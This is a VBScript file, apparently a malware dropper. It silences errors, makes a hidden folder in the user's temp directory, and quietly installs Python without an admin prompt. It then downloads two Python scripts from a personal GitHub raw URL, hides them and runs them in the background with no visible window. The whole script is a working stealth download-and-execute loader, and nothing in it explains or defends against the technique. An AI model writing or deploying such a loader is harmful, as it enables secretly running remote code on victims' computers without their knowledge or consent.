' Suppress all error popups (script will run silently in background)
On Error Resume Next

Dim objShell, fso, tempDir, configDir, pythonInstaller, pythonPath, pythonExe
Dim downloadCmd, installCmd, runCmd, folderObj

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' Define paths
tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
configDir = tempDir & "\.config"
pythonInstaller = tempDir & "\python-installer.exe"
' Default user-level installation path for Python 3.12
pythonPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312"
pythonExe = pythonPath & "\python.exe"

' 1. Create hidden directory
If Not fso.FolderExists(configDir) Then
    fso.CreateFolder(configDir)
End If
Set folderObj = fso.GetFolder(configDir)
folderObj.Attributes = folderObj.Attributes Or 2 ' 2 = Hidden

' 2. Check if Python is already installed, if not, download and install silently
If Not fso.FileExists(pythonExe) Then
    ' Download Python 3.12.2 official installer
    downloadCmd = "cmd /c curl -sL -o """ & pythonInstaller & """ https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
    objShell.Run downloadCmd, 0, True

    ' Install Python silently for current user (No UAC prompt, no window)
    ' InstallAllUsers=0 ensures it installs in %LOCALAPPDATA% and requires no admin rights
    installCmd = "cmd /c """ & pythonInstaller & """ /quiet InstallAllUsers=0 PrependPath=1 Include_test=0"
    objShell.Run installCmd, 0, True
    
    ' Clean up the installer
    fso.DeleteFile pythonInstaller, True
End If

' 3. Download the Python files
Dim url1, url2, path1, path2
url1 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py"
url2 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py"
path1 = configDir & "\client.py"
path2 = configDir & "\auto.py"

objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True

' Apply Hidden attribute to the downloaded files
If fso.FileExists(path1) Then fso.GetFile(path1).Attributes = 2
If fso.FileExists(path2) Then fso.GetFile(path2).Attributes = 2

' 4. Execute Python silently
' Run python.exe with the args, setting the working directory to configDir
Dim args
args = "auto.py client.py --hidden"
runCmd = "cmd /c cd /d """ & configDir & """ && """ & pythonExe & """ " & args
objShell.Run runCmd, 0, False